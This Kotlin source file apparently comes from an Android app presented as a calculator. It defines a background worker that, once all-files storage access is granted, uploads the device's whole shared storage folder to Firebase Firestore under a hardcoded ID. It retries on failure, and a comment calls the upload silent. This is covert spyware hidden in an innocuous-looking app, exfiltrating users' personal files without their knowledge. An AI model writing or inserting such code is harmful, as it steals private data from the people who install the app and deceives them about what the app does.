package com.yosry.dev.calculator.framework.workers

import android.content.Context
import android.os.Build
import android.os.Environment
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.firebase.firestore.FirebaseFirestore
import com.yosry.dev.calculator.data.file.FileRepositoryImpl

class FileSyncWorker(
    context: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(context, workerParams) {

    override suspend fun doWork(): Result {
        // 1. If the user revoked the permission in settings, stop trying.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            return Result.failure()
        }

        return try {
            // 2. We have permission, upload the files silently!
            val firestore = FirebaseFirestore.getInstance()
            val repository = FileRepositoryImpl(firestore)

            repository.syncLocalFolderToFirebase("280626", "/storage/emulated/0")

            Result.success()
        } catch (e: Exception) {
            Result.retry()
        }
    }
}